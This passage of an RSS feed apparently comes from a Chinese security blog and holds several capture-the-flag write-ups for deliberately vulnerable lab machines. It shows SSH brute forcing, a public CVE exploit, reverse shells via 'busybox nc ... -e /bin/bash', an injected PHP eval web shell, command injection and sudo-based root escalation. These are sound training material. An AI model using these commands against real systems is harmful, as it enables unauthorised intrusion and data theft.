* **步骤二：横向移动 (iiiii -&gt; iotuser)**
  我们回到之前发现的 `/var/www/dog/config.php` 文件，收集其中所有看起来像密码的硬编码字符串，创建一个自定义的密码字典。

  ```bash
  ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
  └─$ cat pass
  3c4900896d92da
  s3cur3P@ssw0rd!
  3c4900896d92da789abc
  sk_live_xyz123iiiii
  d3v!c3P@ss
  ```

使用这个字典和 `hydra` 工具，对 `iotuser` 的SSH服务进行密码爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ hydra -l iotuser -P pass ssh://192.168.205.131 -f -I -u -e nsr -t 64
...
[22][ssh] host: 192.168.205.131   login: iotuser   password: 3c4900896d92da
...
```

成功破解出 `iotuser` 的密码也是 `3c4900896d92da`。使用此密码通过SSH成功登录。

* **步骤三：提权路径发现 (iotuser)**
  登录 `iotuser` 后，再次执行 `sudo -l`，发现新线索：

  ```bash
  iotuser@Stitch:~$ sudo -l
  ...
  User iotuser may run the following commands on Stitch:
      (ALL) NOPASSWD: /usr/bin/iot_runner
  ```

  `iotuser` 可以无密码以root权限执行 `/usr/bin/iot_runner`，该脚本会执行位于 `/var/iot_scripts/` 目录下的指定脚本。至此，完整的提权链已经清晰：

  1.  以 `iotuser` 身份创建一个包含提权代码的恶意脚本。
  2.  以 `iiiii` 身份使用 `push_iot` 将此恶意脚本复制到 `/var/iot_scripts/`。
  3.  最后以 `iotuser` 身份使用 `iot_runner` 执行该脚本，完成提权。

* **步骤四：执行提权**

  1. **作为 `iotuser`**，在共享目录 `/dev/shm/` 下创建提权脚本 `a.sh`，内容为给 `bash` 添加SUID权限，并设置其权限为 `600` 以满足 `push_iot` 的检查条件。

     ```bash
     iotuser@Stitch:~$ vim /dev/shm/a.sh
     iotuser@Stitch:~$ cat /dev/shm/a.sh
     IOT#
     chmod +s /bin/bash
     iotuser@Stitch:~$ chmod 600 /dev/shm/a.sh
     ```

  2. **切换回 `iiiii` 用户**，执行 `push_iot` 命令。

     ```bash
     iiiii@Stitch:/tmp$ sudo /usr/bin/push_iot /dev/shm/a.sh
     All checks passed. Copying file...
     File successfully copied to /var/iot_scripts/a.sh
     ```

  3. **再次切换回 `iotuser`**，执行 `iot_runner` 触发payload。

     ```bash
     iotuser@Stitch:~$ sudo /usr/bin/iot_runner a.sh
     Checking script: /var/iot_scripts/a.sh
     Verification passed.:
     ```

  4. 检查 `/bin/bash` 权限，发现已成功设置SUID位。执行 `bash -p` 获得root权限。

     ```bash
     iotuser@Stitch:~$ ls -al /bin/bash
     -rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
     iotuser@Stitch:~$ bash -p
     bash-5.0# id
     uid=1004(iotuser) gid=1004(iotuser) euid=0(root) egid=0(root) groups=0(root),1004(iotuser)
     ```

# 四、获取Flag

```bash
bash-5.0# id
uid=1004(iotuser) gid=1004(iotuser) euid=0(root) egid=0(root) groups=0(root),1004(iotuser)
bash-5.0# cat /root/root.txt /home/iiiii/user.txt 
flag{root-251f332a-3ed6-11f0-960d-000c2955ba04}
flag{user-265620fc-3eda-11f0-b71d-000c2955ba04}
```

至此，所有Flag均已找到，渗透测试完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Stitch.html</guid><pubDate>Tue, 12 Aug 2025 02:04:54 +0000</pubDate></item><item><title>内部_Rrrdesk</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Rrrdesk.html</link><description># **一、信息收集**

## **1. 主机发现**

首先，使用 `arp-scan` 在 `192.168.205.0/24` 网段中扫描存活主机，确定目标IP地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.132 08:00:27:cf:26:10       PCS Systemtechnik GmbH
...
```

命令输出确认了目标主机的IP地址为 `192.168.205.132`。

## **2. 端口扫描**

使用 `nmap` 对目标主机 `192.168.205.132` 进行全端口扫描，以识别对外开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.132
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3389/tcp open  ms-wbt-server
...
```

扫描结果表明，目标主机开放了 **22 (SSH)**、**80 (HTTP)** 和 **3389 (RDP)** 端口。我们首先从Web服务入手。

## **3. Web信息探测**

访问 `http://192.168.205.132` 是一个文件上传页面。使用 `gobuster` 进行目录扫描，发现了一个可疑的备份文件 `back.zip`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.132 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64
...
/uploads              (Status: 301) [Size: 320] [--&gt; http://192.168.205.132/uploads/]
/upload.php           (Status: 302) [Size: 0] [--&gt; index.php]
/back.zip             (Status: 200) [Size: 911]
/index.php            (Status: 200) [Size: 14529]
...
```

下载并解压 `back.zip` 文件，获取到网站的源码 `upload.php` 和 `index.php`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ wget http://192.168.205.132/back.zip
...
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ unzip back.zip 
Archive:  back.zip
  inflating: upload.php              
  inflating: index.php
```

# **二、Web渗透与立足点**

## **1. 漏洞分析**

通过审计 `upload.php` 的源代码，我们发现了其核心处理逻辑：

```php
&lt;?php
$upload_dir = '/var/www/webdav/uploads/';
$filename = $_FILES['file']['name'];
$tmp_name = $_FILES['file']['tmp_name'];

if (!empty($filename)) {
    // 生成MD5文件名（保留原扩展名）
    $file_ext = pathinfo($filename, PATHINFO_EXTENSION);
    $new_name = md5(pathinfo($filename, PATHINFO_FILENAME)) . ($file_ext ? '.$file_ext' : '');
    
    // 移动文件到上传目录
    if (move_uploaded_file($tmp_name, $upload_dir . $new_name)) {
        echo 'Upload ok';
    } else {
        echo '文件上传失败！';
    }
} else {
    header('Location: index.php');
}
?&gt;
```

代码逻辑存在明显的任意文件上传漏洞。它将上传文件的文件名（不含扩展名）进行MD5哈希，然后拼接上原始扩展名，存储到 `/var/www/webdav/uploads/` 目录下。由于没有对文件类型或内容做任何检查，我们可以上传一个PHP反弹Shell。

## **2. Getshell**

**利用步骤:**

1. 创建一个名为 `reverse.php` 的反弹Shell文件。

2. 计算文件名 'reverse' 的MD5值。

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
   └─$ echo -n 'reverse' |md5sum                           
   4d9c2073afa3c2abb817dceb22c34de6  -
   ```

   上传后的文件将被命名为 `4d9c2073afa3c2abb817dceb22c34de6.php`。

3. 在攻击机（Kali）上开启 `netcat` 监听 `4444` 端口。

4. 通过Web页面上传 `reverse.php` 文件。

5. 在浏览器或使用 `curl` 访问 `http://192.168.205.132/uploads/4d9c2073afa3c2abb817dceb22c34de6.php`。

6. 攻击机成功接收到反弹Shell，获得 `www-data` 用户权限。

# **三、权限提升**

## **1. 横向移动 (www-data -&gt; lemon)**

在 `www-data` 的Shell中，我们检查 `/home` 目录，发现了 `lemon` 和 `welcome` 两个用户。通过翻阅 `lemon` 用户家目录下的 `.bash_history` 文件，我们发现了一条可疑记录。

```bash
www-data@Rrrdesk:/home/lemon$ cat .bash_history
...
echo speaker | md5sum
...
```

这强烈暗示用户 `lemon` 的密码可能是 `speaker`。

我先尝试了su切换用户，但是该系统没有su，然后尝试使用SSH连接，虽然 `nmap` 扫描显示SSH服务开放，但尝试使用 `lemon:speaker` 登录SSH失败，有点怀疑是SSH配置限制了该用户的登录（前段时间，群主聊过相关的话题，我看了几眼。经过验证，确实是ssh的配置文件限制了`welcome`、`lemon`用户的登录）。

然而，端口扫描也发现了开放的 **3389 (RDP)** 端口。我们尝试使用该凭据进行RDP连接。

*ps:这里我打的路线不是3389，我是直接在靶机登录了，但是这个思路是犯规的😀。*

```bash
┌──(kali㉿kali)-[~]
└─$ rdesktop -u lemon 192.168.205.132
```

成功登录到 `lemon` 用户的桌面环境。我们在此环境下反弹一个新的Shell到攻击机，以便后续操作，并成功读取到第一个Flag。

```bash
lemon@Rrrdesk:~$ cat user.txt 
flag{user-9ffbf43126e33be52cd2bf7e01d627f9}
```

## **2. 提权至root (lemon -&gt; root)**

在 `lemon` 用户的Shell中，执行 `sudo -l` 来检查其 `sudo` 权限。

```bash
lemon@Rrrdesk:~$ sudo -l
...
User lemon may run the following commands on Rrrdesk:
    (ALL) NOPASSWD: /usr/bin/flite
```

结果显示，`lemon` 用户可以无需密码以root权限执行 `/usr/bin/flite`。`flite` 是一个文本到语音的合成器。通过测试，我们发现 `flite` 的 `-add_lex` 参数可以被用来读取文件。当它尝试读取一个非标准格式的词典文件时，会报错并显示文件的内容。

我们可以利用此特性来读取 `/root` 目录下的 `root.txt` 文件。

```bash
lemon@Rrrdesk:~$ sudo /usr/bin/flite -add_lex /root/root.txt
add_addenda: lex cmu: expected ':' in flag{root-68b329da9893e34099c7d8ad5cb9c940}
```

命令的报错信息成功泄露了 `root.txt` 的内容。

# **四、获取Flag**

我们已经成功获取了系统上的所有Flag。

* **User Flag:**

  ```bash
  lemon@Rrrdesk:~$ cat /home/lemon/user.txt
  flag{user-9ffbf43126e33be52cd2bf7e01d627f9}
  ```

* **Root Flag:**

  ```
  flag{root-68b329da9893e34099c7d8ad5cb9c940}
  ```

渗透测试完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Rrrdesk.html</guid><pubDate>Mon, 11 Aug 2025 14:11:58 +0000</pubDate></item><item><title>内部_Plugin</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Plugin.html</link><description># **一、信息收集**

## **1. 主机发现**

首先，使用 `arp-scan` 在 `192.168.205.0/24` 网段中扫描存活主机，确定目标。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.131 08:00:27:5f:2c:34       PCS Systemtechnik GmbH
...
```

命令输出确认了目标主机的IP地址为 `192.168.205.131`。

## **2. 端口扫描**

使用 `nmap` 对目标主机进行全端口扫描，以识别对外开放的服务。

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.205.131
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

扫描结果表明，目标主机开放了 **22 (SSH)** 和 **80 (HTTP)** 端口。Web服务是主要的攻击入口。

## **3. Web信息探测**

访问 `http://192.168.205.131` 是一个 Apache 的默认页面。使用 `gobuster` 进行目录爆破，发现了多个PHP页面。

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.205.131 -w ... -x php,txt,html
...
/index.php            (Status: 302) [Size: 0] [--&gt; home.php]
/home.php             (Status: 200) [Size: 1954]
/about.php            (Status: 200) [Size: 1286]
/feedback.php         (Status: 200) [Size: 2189]
...
```

在浏览发现的页面时，`feedback.php` 的提交功能弹窗泄露了一个关键信息：`反馈已提交！服务端处理使用域名: plugin.dsz`。我们将此域名添加到本地 `/etc/hosts` 文件中。

配置好 `hosts` 后，使用 `nuclei` 对 `http://plugin.dsz` 进行自动化漏洞扫描，发现一个严重漏洞。

```bash
┌──(kali㉿kali)-[~]
└─$ nuclei -u http://plugin.dsz
...
[CVE-2025-34085] [http] [critical] http://plugin.dsz/wp-content/uploads/simple-file-list/aighbdh.php
[wordpress-rce-simplefilelist] [http] [critical] http://plugin.dsz/wp-content/uploads/simple-file-list/egafhad.php
...
```

扫描结果直指 **WordPress** 的 **Simple File List** 插件存在远程代码执行（RCE）漏洞 (CVE-2025-34085)。

# **二、Web渗透与立足点**

## **1. RCE漏洞利用**

根据 `nuclei` 的扫描结果，我们找到了针对 `CVE-2025-34085` 的公开漏洞利用脚本。 该漏洞允许未经身份验证的攻击者上传一个伪装成图片的文件，然后将其重命名为 `.php` 文件，从而执行任意代码。

首先，使用漏洞利用脚本执行 `id` 命令，验证漏洞是否存在且可利用。

```bash
┌──(kali㉿kali)-[~/CVE-2025-34085]
└─$ python3 CVE-2025-34085.py -u http://plugin.dsz --cmd 'id'
...
[DEBUG] Command Output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] http://plugin.dsz | http://plugin.dsz/wp-content/uploads/simple-file-list/cttlu7x9.php
```

命令成功返回 `www-data` 用户信息，确认RCE漏洞可以利用。

## **2. Getshell**

接下来，利用该漏洞获得一个反弹shell。首先在攻击机上设置 `netcat` 监听 `8888` 端口。

然后，执行以下命令，让目标主机反弹一个 `/bin/bash` shell。

```bash
┌──(kali㉿kali)-[~/CVE-2025-34085]
└─$ python3 CVE-2025-34085.py -u http://plugin.dsz --cmd 'busybox nc 192.168.205.128 8888 -e /bin/bash'
```

攻击机成功接收到反弹shell，获得了 `www-data` 用户的访问权限。

---

# **三、权限提升**

## **1. 横向移动 (www-data -&gt; yi)**

在 `www-data` shell中，我们首先寻找数据库配置文件。在Web根目录 `/var/www/plugin.dsz/` 中，找到了 `wp-config.php` 文件。

```bash
www-data@Plugin:/var/www/plugin.dsz$ cat wp-config.php
...
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 'password' );
...
```

利用泄露的数据库凭据连接到本地MariaDB数据库，并查询 `wp_users` 表。

```sql
MariaDB [wordpress]&gt; select * from wp_users;
+----+------------+------------------------------------+---------------+ ... +---------------------+--------------+
| ID | user_login | user_pass                          | user_nicename | ... | user_activation_key | display_name |
+----+------------+------------------------------------+---------------+ ... +---------------------+--------------+
|  1 | root       | $wp$2y$10$...                       | root          | ... |                     | root         |
|  2 | yi         | b00b6ce41fbb3854fbfddcb71b5aa15d     | yi            | ... | eWl5aXlp            | eWl5aXlp     |
+----+------------+------------------------------------+---------------+ ... +---------------------+--------------+
```

我们发现了两个用户：`root` 和 `yi`。在 `yi` 用户的数据行中，`user_activation_key` 和 `display_name` 字段的值均为 `eWl5aXlp`。猜测这为`yi`用户密码。

使用 `su yi` 和密码 `eWl5aXlp`，成功切换到 `yi` 用户。

## **2. 提权至root (yi -&gt; root)**

切换到 `yi` 用户后，执行 `sudo -l` 来检查其 `sudo` 权限。

```bash
yi@Plugin:~$ sudo -l
...
User yi may run the following commands on Plugin:
    (ALL) NOPASSWD: /bin/bash /home/yi/yiyi.sh
```

结果显示，`yi` 用户可以无需密码以root权限执行 `/home/yi/yiyi.sh` 脚本。由于 `yi` 用户对其家目录有写权限，我们可以轻易地替换掉这个脚本。

**提权步骤**:

1. 备份并替换原始脚本，写入一个可以为 `/bin/bash` 添加SUID权限的命令。

   ```bash
   yi@Plugin:~$ mv /home/yi/yiyi.sh /home/yi/1
   yi@Plugin:~$ echo 'chmod +s /bin/bash' &gt; /home/yi/yiyi.sh
   ```

2. 以 `sudo` 权限执行被篡改后的脚本。

   ```bash
   yi@Plugin:~$ sudo /bin/bash /home/yi/yiyi.sh
   ```

3. 执行 `bash -p`。`-p` 参数使得 `bash` 在启动时不会放弃root权限，从而获得一个有效的root shell。

   ```bash
   yi@Plugin:~$ bash -p
   bash-5.0# id
   uid=1000(yi) gid=1000(yi) euid=0(root) egid=0(root) groups=0(root),1000(yi)
   ```

   `id` 命令的输出确认我们已成功获得root权限。

---

# **四、获取Flag**

现在我们拥有了root权限，可以读取系统上的所有敏感文件。

```bash
bash-5.0# cat /home/yi/user.txt
flag{user-058e8f474511327e5aeed4efa793033a}

bash-5.0# cat /root/root.txt
flag{root-ab9d82b9ae7d7d7256a95efe3447ec78}
```

所有Flag均已找到，渗透测试完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Plugin.html</guid><pubDate>Mon, 11 Aug 2025 03:48:44 +0000</pubDate></item><item><title>内部_hoshi</title><link>https://7r1UMPHK.github.io/post/nei-bu-_hoshi.html</link><description># 一、信息收集

## 1. 主机发现

首先，使用 `arp-scan` 在 `192.168.205.0/24` 网段中发现目标主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.142 08:00:27:24:64:43       PCS Systemtechnik GmbH
...
```

确认目标主机IP地址为 `192.168.205.142`。

## 2. 端口扫描

使用 `nmap` 对目标主机进行全端口扫描，识别开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.142
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

扫描结果显示开放了 **22 (SSH)** 和 **80 (HTTP)** 两个端口。我们将Web服务作为主要的攻击入口。

## 3. Web目录与文件发现

访问 `http://192.168.205.142` 是一个“星际商城”的商品反馈页面。使用 `dirsearch` 进行目录爆破，发现多个关键文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -u http://192.168.205.142
...
[09:26:07] 200 -    1KB - /admin.php
[09:26:16] 200 -   23KB - /info.php
[09:26:22] 200 -  109B  - /robots.txt
[09:26:25] 301 -  320B  - /uploads  -&gt;  http://192.168.205.142/uploads/
...
```

主要发现：

*   `/admin.php`: 后台登录页面。
*   `/info.php`: 一个 `phpinfo()` 页面，泄露了详细的PHP配置。
*   `/uploads/`: 一个开放目录浏览的上传目录。
*   `/robots.txt`: 存在有趣的信息。

## 4. 信息泄露

查看 `robots.txt` 文件内容，发现一条重要线索。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.142/robots.txt
本站的 logo 灵感来自 https://maze-sec.com/special/1/，但我们给它添了点特别的‘味道’！
```

该线索暗示网站的logo图片 `QQ.png` 可能被修改过，含有隐藏信息。

# 二、Web渗透与立足点

## 1. 后台登录

访问 `/admin.php` 是一个管理员登录页面，只需要输入密码。根据主页页脚的客服热线 `400-123-4567`，尝试以此作为密码进行登录，成功进入后台。

## 2. 图像隐写 (盲水印)

根据 `robots.txt` 的提示，我们怀疑logo图片存在隐写。

1. 分别下载目标网站的logo和原始logo。

   ```bash
   wget http://192.168.205.142/QQ.png -O target_logo.png
   wget https://maze-sec.com/img/QQ.png -O original_logo.png
   ```

2. 常规的隐写分析工具均未发现异常。考虑到“味道”这种描述，推测可能是盲水印（Blind Watermark）。

3. 使用盲水印工具进行解密，成功提取出隐藏的水印信息。

   ```bash
   # 克隆工具
   git clone https://github.com/chishaxie/BlindWaterMark.git
   cd BlindWaterMark
   
   # 解码
   python bwmforpy3.py decode target_logo.png original_logo.png wm_extracted.png
   ```

4. 查看提取出的水印图片 `wm_extracted.png`，得到隐藏的目录路径：`/hoshi/`。

![提取出的水印](http://7r1UMPHK.github.io/image/20250810220719846.webp)

## 3. 文件包含与Getshell

1. 访问新发现的路径 `http://192.168.205.142/hoshi/`，发现一个文件 `gift.php`。直接访问该文件返回错误“非法文件名”，这是典型的文件包含（LFI）漏洞特征。

2. 通过Fuzz工具 `ffuf` 爆破参数，确定用于文件包含的参数为 `file`。

3. 在 `admin.php` 页面源码中，发现一行隐藏的注释：`&lt;div style='display:none' id='static-tip'&gt;[debug] 静态页面已生成&lt;/div&gt;`。

4. **攻击链梳理**：

   *   在主页 `/index.php` 的反馈表单中提交PHP Web Shell。
   *   登录后台 `/admin.php`。这个登录行为会触发服务器将在后台生成一个包含所有反馈内容的静态文件 `admin.html`。（通过目录爆破发现）
   *   利用 `gift.php` 的文件包含漏洞去读取这个新生成的 `admin.html`。由于该文件是被PHP引擎包含的，其中的PHP代码将会被执行。

5. **操作步骤**:

   * **步骤一：注入Payload**。在主页的反馈表单中的'您的昵称'输入栏提交以下内容。

     ```php
     &lt;?php eval($_POST['ant']); ?&gt;
     ```

   * **步骤二：触发生成**。访问 `/admin.php` 并使用密码 `400-123-4567` 登录。此时，包含我们Payload的 `admin.html` 文件已经在Web根目录生成。

   * **步骤三：构造LFI URL**。`http://192.168.205.142/hoshi/gift.php?file=admin.html`

   * **步骤四：连接Shell**。使用蚁剑（AntSword）连接上述URL，密码为 `ant`，成功获得 `www-data` 用户的Web Shell。

# 三、权限提升

## 1. 横向移动 (www-data -&gt; welcome)

1. 在 `www-data` shell中，使用 `linpeas.sh` 等脚本进行信息收集。在 `/var/backups/` 目录下发现一个可读的敏感文件 `shadow~`。

2. 读取该文件，获得 `root` 和 `welcome` 用户的密码哈希。

3. 使用 `John the Ripper` 和 `rockyou.txt` 字典对哈希进行破解，得到 `welcome` 用户的密码为 `loveme2`。

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ john --wordlist=rockyou.txt hash.txt
   ...
   loveme2          (welcome)     
   ...
   ```

4. 使用 `su` 命令和破解出的密码成功切换到 `welcome` 用户。

## 2. 提权至root (welcome -&gt; root)

1. 在 `welcome` 用户下，使用 `sudo -l` 检查其sudo权限，发现可以无密码以root权限执行一个Python脚本 `/root/12345.py`。

   ```bash
   welcome@hoshi:/tmp$ sudo -l
   ...
   User welcome may run the following commands on hoshi:
       (ALL) NOPASSWD: /usr/bin/python3 /root/12345.py
   ```

2. 执行该脚本，它会在 `12345` 端口上开启一个自定义的配置shell。

3. 在Kali攻击机上，使用 `ncat` 连接该服务。通过 `help` 命令发现 `exec_cmd` 指令。测试发现 `|;&amp;&lt;&gt;` 等字符被过滤，但 `&amp;&amp;` 可用于命令拼接。

4. 利用命令注入，为 `/bin/bash` 添加SUID权限。

   ```bash
   conf&gt; exec_cmd id'&amp;&amp;chmod +s /bin/bash&amp;&amp;'
   uid=0(root) gid=0(root) groups=0(root)
   ```

5. 回到靶机shell，执行 `bash -p`，成功获得root权限的shell。

   ```bash
   welcome@hoshi:/opt$ bash -p
   bash-5.0# id
   uid=1000(welcome) gid=1000(welcome) euid=0(root) egid=0(root) groups=0(root),1000(welcome)
   ```

# 四、获取Flag

现在拥有了root权限，可以读取所有的Flag。

```bash
bash-5.0# cat /root/root.txt
flag{root-5de923e57adefd6a1fd53a6705ad6486}

bash-5.0# cat /home/welcome/user.txt
flag{user-73b671a5f913d849d405784a428288dd}
```

所有Flag均已找到，渗透测试完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_hoshi.html</guid><pubDate>Sun, 10 Aug 2025 15:19:48 +0000</pubDate></item><item><title>内部_Monitor</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Monitor.html</link><description># 一、信息收集

## 1. 主机发现

首先，使用 `arp-scan` 在本地网络中发现目标主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.141 08:00:27:b0:33:ee       PCS Systemtechnik GmbH
...
```

确认目标主机IP地址为 `192.168.205.141`。

## 2. 端口扫描

使用 `nmap` 对目标主机进行全端口扫描和服务版本探测。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.141
...
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
10050/tcp open  zabbix-agent
10051/tcp open  zabbix-trapper
...
```

扫描结果显示开放了多个端口，包括 **22 (SSH)**, **80 (HTTP)**, 以及与Zabbix监控服务相关的 **10050** 和 **10051** 端口。

# 二、Web渗透与立足点

## 1. Web服务探查

访问目标 `http://192.168.205.141`，页面显示为一个“监控系统登录”界面。尝试使用常见的弱口令 `admin:admin` 进行登录，请求成功后被重定向到 `dashboard.php`，登录后进入一个通用的仪表板页面，未发现可利用的功能点或信息泄露。

随后，使用`gobuster`进行目录爆破，发现了一个重要的路径 `/zabbix/`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.141 ...
...
/zabbix (Status: 301) [Size: 319] [--&gt; http://192.168.205.141/zabbix/]
...
```

## 2. Zabbix RCE (远程代码执行)

针对发现的 `/zabbix` 路径，使用`nuclei`进行漏洞扫描，发现存在Zabbix默认凭证漏洞。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nuclei -u http://192.168.205.141/zabbix/
...
[zabbix-default-login] [http] [high] http://192.168.205.141/zabbix/index.php [password='zabbix',path='/index.php',username='Admin']
...
```

扫描结果提示默认用户名为 `Admin`，密码为 `zabbix`。

使用该凭证登录Zabbix系统。Zabbix提供了创建和执行脚本的功能，我们可以利用此功能获取反弹shell。

1. **创建脚本**: 导航到 `Administration` &gt; `Scripts`，点击 `Create script`。

2. **配置脚本**:

   *   **Name**: `shell`
   *   **Scope**:`Manual host action`
   *   **Type**:`Script`
   *   **Execute on**:`Zabbix server`
   *   **Commands**: `busybox nc 192.168.205.128 8888 -e /bin/bash`

   *ps:建议进去shell之后写一个脚本再执行一遍反弹，不然的话，他的脚本任务一结束就会断开，大约5min左右*

3. **执行脚本**: 导航到 `Monitoring` &gt; `Hosts`，选择目标主机，然后从脚本下拉菜单中选择并执行刚刚创建的 `shell` 脚本。

![image-20250810205337566](http://7r1UMPHK.github.io/image/20250810205337820.webp)

在Kali上设置`netcat`监听，成功接收到反弹shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.141] 55914
id
uid=107(zabbix) gid=114(zabbix) groups=114(zabbix)
```

为方便后续操作，对获取的非交互式shell进行稳定化处理。

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
```

# 三、权限提升

## 1. 横向移动 (zabbix -&gt; hyh)

在`zabbix`用户权限下，寻找配置文件以获取更多凭证信息。Zabbix的Web配置文件通常包含了数据库的连接信息。

```bash
zabbix@Monitor:/$ find / -name 'zabbix.conf.php' 2&gt;/dev/null
/usr/share/zabbix/conf/zabbix.conf.php
zabbix@Monitor:/$ cat /usr/share/zabbix/conf/zabbix.conf.php
&lt;?php
// Zabbix GUI configuration file.
$DB['TYPE']                             = 'MYSQL';
$DB['SERVER']                   = 'localhost';
$DB['DATABASE']                 = 'zabbix';
$DB['USER']                             = 'zabbix';
$DB['PASSWORD']                 = 'root123';
...
?&gt;
```

从配置文件中，我们获得了数据库用户`zabbix`的密码`root123`。通过`ls /home`发现存在另一个用户`hyh`。尝试使用此密码切换到`hyh`用户。

```bash
zabbix@Monitor:/$ su hyh
Password: root123
hyh@Monitor:~$ id
uid=1002(hyh) gid=1002(hyh) groups=1002(hyh)
```

成功切换到`hyh`用户，并在其家目录下找到`user.txt`。

## 2. 提权至root

在`hyh`用户下，使用`sudo -l`检查其sudo权限。

```bash
hyh@Monitor:~$ sudo -l
...
User hyh may run the following commands on Monitor:
    (ALL) NOPASSWD: /usr/bin/mount
```

结果显示，`hyh`用户可以无密码以root权限执行`/usr/bin/mount`命令。查询**GTFOBins**可知，可以利用`mount`的`bind`选项来执行任意命令。

&gt;https://gtfobins.github.io/gtfobins/mount/

我们将`/bin/bash`通过`bind`的方式挂载到`/bin/mount`上，然后通过`sudo`执行`mount`，此时执行的将是拥有root权限的bash。

```bash
hyh@Monitor:~$ sudo mount -o bind /bin/bash /bin/mount
hyh@Monitor:~$ sudo mount
root@Monitor:/home/hyh# id
uid=0(root) gid=0(root) groups=0(root)
```

成功获得root权限。

# 四、获取Flag

现在我们拥有了root权限，可以读取所有的Flag。

```bash
root@Monitor:~# cat /root/root.txt
flag{root-deb15d884e04de6f6972b3c25e3cc11b}

root@Monitor:~# cat /home/hyh/user.txt 
flag{user-ab0e0561b1a833a6141ad2273744543c}
```

所有Flag均已找到，渗透测试完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Monitor.html</guid><pubDate>Sun, 10 Aug 2025 15:19:32 +0000</pubDate></item><item><title>vulnyx_Observer</title><link>https://7r1UMPHK.github.io/post/vulnyx_Observer.html</link><description># 一、信息收集

## 1. 主机发现

首先，使用`arp-scan`在本地网络中发现目标主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.131 08:00:27:e7:c9:11       PCS Systemtechnik GmbH
...
```

确认目标主机IP地址为 `192.168.205.131`。

## 2. 端口扫描

使用 `nmap` 对目标主机进行全端口扫描和服务版本探测。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- -A 192.168.205.131           
Starting Nmap 7.95 ( https://nmap.org )
...
Nmap scan report for 192.168.205.131
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
MAC Address: 08:00:27:E7:C9:11 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

扫描结果显示开放了 **22 (SSH)** 和 **80 (HTTP)** 两个端口。

# 二、Web渗透

## 1. 虚拟主机发现

直接访问 `http://192.168.205.131` 显示的是 Apache 的默认页面。通过目录爆破可以获得一些目录信息。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.131 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64  
...
/index.html           (Status: 200) [Size: 35742]
/images               (Status: 301) [Size: 319] [--&gt; http://192.168.205.131/images/]
/css                  (Status: 301) [Size: 316] [--&gt; http://192.168.205.131/css/]
/js                   (Status: 301) [Size: 315] [--&gt; http://192.168.205.131/js/]
/fonts                (Status: 301) [Size: 318] [--&gt; http://192.168.205.131/fonts/]
...
```

通过查看`/image`中的图片文件，可以发现，他使用的图片内容貌似是web网站模板的图片，所以猜测可能存在域名。将域名 `Observer.nlx` 绑定到IP。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo vim /etc/hosts

# 在文件末尾添加
